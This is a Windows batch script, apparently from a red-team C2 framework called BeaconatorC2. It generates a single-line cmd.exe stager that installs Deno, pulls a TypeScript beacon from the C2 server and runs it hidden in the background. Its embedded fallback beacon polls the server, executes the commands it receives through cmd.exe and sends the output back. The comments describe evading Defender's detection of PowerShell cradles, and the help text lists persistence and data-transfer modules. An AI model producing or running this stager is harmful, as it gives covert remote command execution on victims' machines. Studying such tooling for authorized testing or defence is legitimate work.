@echo off
setlocal
rem =====================================================================
rem Deno One-Liner Beacon Generator for BeaconatorC2 (Windows)
rem
rem Generates a single cmd.exe line (pure cmd - no PowerShell in the
rem default path, to avoid Defender behavioral detection of PS cradles):
rem
rem   Stage 1: Installs Deno (if missing) using script-based installers,
rem            in evasiveness-preferred order:
rem              1. winget (native Microsoft package manager traffic)
rem              2. official deno.land install.ps1 (curl + powershell -File,
rem                 only when winget is unavailable or fails)
rem              3. scoop / choco shims (only if already installed)
rem            An existing deno.exe on PATH is reused.
rem   Stage 2: Pulls the full TypeScript beacon (deno_beacon.ts) from the
rem            C2 server itself via the to_beacon|deno_beacon.ts HTTP
rem            file-transfer command (curl POST), saved to %TEMP%\win_up.ts.
rem            If the pull fails or returns a short error body, an embedded
rem            minimal fallback beacon is run via "deno eval" instead.
rem   Stage 3: Runs the beacon hidden in the background:
rem            start "" /b deno run -A "%TEMP%\win_up.ts" <server> <port>
rem            <endpoint> <interval>   (config via CLI args; no leftover
rem            environment variables)
rem
rem Implementation note: cmd's "if" statement absorbs the rest of a line
rem (including &-chained commands) into its conditional body, so fail-through
rem "if not defined X" guard chains die at the first false condition. The
rem one-liner therefore uses errorlevel-chained stages instead: each install
rem stage ends with "if defined DNX (cmd /c exit 0) else (cmd /c exit 1)"
rem and the stages are joined with ||, so stages stop as soon as Deno is
rem resolved. Variables set earlier in the same line cannot be read with
rem %VAR% (parse-time expansion), so the resolved path is relayed through
rem a for /f loop variable at execution time.
rem
rem Paste the generated single line into a cmd prompt (the bash/zsh
rem one-liners are pasted into a shell the same way). For the Run dialog
rem (Win+R) prefix it with:  cmd /c
rem
rem Use only for authorized security testing. See LICENSE / README.md.
rem =====================================================================

set "SERVER=127.0.0.1"
set "PORT=8080"
set "ENDPOINT=/"
set "INTERVAL=15"
set "ACTION="
set "SCRIPT_DIR=%~dp0"

:parse
if "%~1"=="" goto :parsed
if /i "%~1"=="-h" goto :help
if /i "%~1"=="--help" goto :help
if /i "%~1"=="-s" set "SERVER=%~2"
if /i "%~1"=="--server" set "SERVER=%~2"
if /i "%~1"=="-p" set "PORT=%~2"
if /i "%~1"=="--port" set "PORT=%~2"
if /i "%~1"=="-e" set "ENDPOINT=%~2"
if /i "%~1"=="--endpoint" set "ENDPOINT=%~2"
if /i "%~1"=="-i" set "INTERVAL=%~2"
if /i "%~1"=="--interval" set "INTERVAL=%~2"
if /i "%~1"=="-g" set "ACTION=generate"
if /i "%~1"=="--generate" set "ACTION=generate"
if /i "%~1"=="-c" set "ACTION=generate"
if /i "%~1"=="--custom" set "ACTION=generate"
shift
goto :parse

:parsed
if "%ACTION%"=="generate" goto :generate
goto :help

:generate
rem Stage the full beacon where the C2 can serve it via to_beacon
if exist "%SCRIPT_DIR%deno_beacon.ts" (
    if exist "%SCRIPT_DIR%..\files\" (
        copy /y "%SCRIPT_DIR%deno_beacon.ts" "%SCRIPT_DIR%..\files\deno_beacon.ts" >nul
        echo [+] Staged deno_beacon.ts into the server's files\ directory
    ) else (
        echo [!] files\ directory not found - run this generator from the repo,
        echo     or copy beacons\deno_beacon.ts to the server's files\ folder.
        echo     Without it the one-liner falls back to a minimal beacon.
    )
)
echo.
echo # Deno One-Liner Beacon for BeaconatorC2 (Windows - pure cmd)
echo # Server: %SERVER%:%PORT%%ENDPOINT%  Interval: %INTERVAL%s
echo # Paste the following single line into a cmd prompt:
echo #   (for the Run dialog, prefix with:  cmd /c )
echo.
set "TMPL=%TEMP%\deno_oneliner_%RANDOM%.txt"
>"%TMPL%" echo set "DNX=" ^&((where deno ^>nul 2^>^&1^&^&for /f "delims=" %%x in ('where deno') do @set "DNX=%%x"^&if defined DNX (cmd /c exit 0) else (cmd /c exit 1))^|^|(winget install --id DenoLand.Deno -e --silent --accept-source-agreements --accept-package-agreements ^>nul 2^>^&1^&(for /d %%y in ("%%LOCALAPPDATA%%\Microsoft\WinGet\Packages\DenoLand.Deno*") do @if exist "%%y\deno.exe" set "DNX=%%y\deno.exe")^&if defined DNX (cmd /c exit 0) else (cmd /c exit 1))^|^|((for %%c in ("%%LOCALAPPDATA%%\Microsoft\WinGet\Links\deno.exe" "C:\ProgramData\Microsoft\WinGet\Links\deno.exe" "%%USERPROFILE%%\.deno\bin\deno.exe" "%%USERPROFILE%%\scoop\shims\deno.exe" "C:\ProgramData\chocolatey\bin\deno.exe") do @(if not defined DNX if exist %%c set "DNX=%%~c"))^&if defined DNX (cmd /c exit 0) else (cmd /c exit 1))^|^|(curl -s -L "https://deno.land/install.ps1" -o "%%TEMP%%\deno_install.ps1"^&^&powershell -NoP -EP Bypass -File "%%TEMP%%\deno_install.ps1" ^>nul 2^>^&1^&del "%%TEMP%%\deno_install.ps1" ^>nul 2^>^&1^&if exist "%%USERPROFILE%%\.deno\bin\deno.exe" set "DNX=%%USERPROFILE%%\.deno\bin\deno.exe"))^&if defined DNX (curl -s -X POST -d "to_beacon|deno_beacon.ts" "http://__SERVER__:__PORT____ENDPOINT__" -o "%%TEMP%%\win_up.ts"^&if exist "%%TEMP%%\win_up.ts" (for /f "tokens=1* delims==" %%a in ('set DNX') do @(for %%z in ("%%TEMP%%\win_up.ts") do @(if %%~zz geq 200 (start "" /b "%%b" run -A "%%TEMP%%\win_up.ts" __SERVER__ __PORT__ __ENDPOINT__ __INTERVAL__ ^>nul 2^>^&1) else (start "" /b "%%b" eval "const S='__SERVER__',P='__PORT__',E='__ENDPOINT__';let I=parseInt('__INTERVAL__');if(isNaN(I))I=15;const U='http://'+S+':'+P+E;const ID='fb'+Math.random().toString(16).slice(2,8);const D=new TextDecoder();async function q(b){const r=await fetch(U,{method:'POST',body:b});return await r.text()}let C='unknown';try{C=Deno.env.get('COMPUTERNAME')||C}catch(e){}try{await q('register|'+ID+'|'+C+'|deno_beacon.yaml')}catch(e){}while(true){let c='';try{c=(await q('request_action|'+ID)).trim()}catch(e){c=''}if(c==='shutdown')break;if(c.length>0){if(c.indexOf('no_pending_commands')<0){if(c.indexOf('ERROR')<0){let o='';try{const x=await new Deno.Command('cmd.exe',{args:['/c',c.replace('execute_command|','')]}).output();o=D.decode(x.stdout)+D.decode(x.stderr)}catch(e){o='ERROR: '+e}try{await q('command_output|'+ID+'|'+o)}catch(e){}}}}await new Promise(r=>setTimeout(r,I*1000))}" ^>nul 2^>^&1))))^&set "DNX=")
powershell -NoP -EP Bypass -Command "(Get-Content -Raw '%TMPL%').Replace('__SERVER__','%SERVER%').Replace('__PORT__','%PORT%').Replace('__ENDPOINT__','%ENDPOINT%').Replace('__INTERVAL__','%INTERVAL%')"
del "%TMPL%" >nul 2>&1
echo.
echo # Notes:
echo #  - Requires an HTTP receiver on the C2 (default endpoint /) and
echo #    files\deno_beacon.ts staged (this generator copies it for you).
echo #  - Pure cmd: no PowerShell process in the default path. PowerShell
echo #    only runs the official deno.land installer if winget is absent.
echo #  - Deno install chain: existing PATH install, then winget, then
echo #    deno.land install.ps1, then scoop/choco if already present.
echo #  - The one-liner is one physical line; it may wrap in your terminal.
echo #  - Run-dialog delivery: cmd /c ^<one-liner^> (a console window stays
echo #    visible until the beacon exits, so prefer pasting into a cmd prompt).
goto :end

:help
echo Deno One-Liner Beacon Generator for BeaconatorC2 (Windows)
echo.
echo Usage: %~nx0 [OPTIONS]
echo.
echo OPTIONS:
echo     -h, --help              Show this help message
echo     -s, --server SERVER     Server IP/hostname (default: 127.0.0.1)
echo     -p, --port PORT         HTTP receiver port (default: 8080)
echo     -e, --endpoint PATH     HTTP endpoint (default: /)
echo     -i, --interval SECONDS  Check-in interval (default: 15)
echo     -g, --generate          Generate default one-liner
echo     -c, --custom            Generate custom one-liner with provided options
echo.
echo Examples:
echo     %~nx0 --generate
echo     %~nx0 --custom --server 192.168.1.100 --port 8080
echo.
echo Stages:
echo     1. Installs Deno via script-based installers (winget, the official
echo        deno.land install.ps1, or scoop/choco if already present).
echo     2. Pulls deno_beacon.ts from the C2 via to_beacon with curl
echo        (falls back to an embedded minimal beacon via deno eval).
echo     3. Runs the full Deno beacon hidden in the background.
echo.
echo Modules (full beacon):
echo     SystemInfo, ProcessEnum, NetworkEnum, UserEnum, ServiceEnum,
echo     EnvironmentEnum, FileSearch, PortScan, DNSEnum, SSH_Discovery,
echo     Persistence (registry/schtasks/startup), DownloadFile, UploadFile,
echo     Cleanup. See schemas\deno_beacon.yaml for operator-side commands.

:end
endlocal
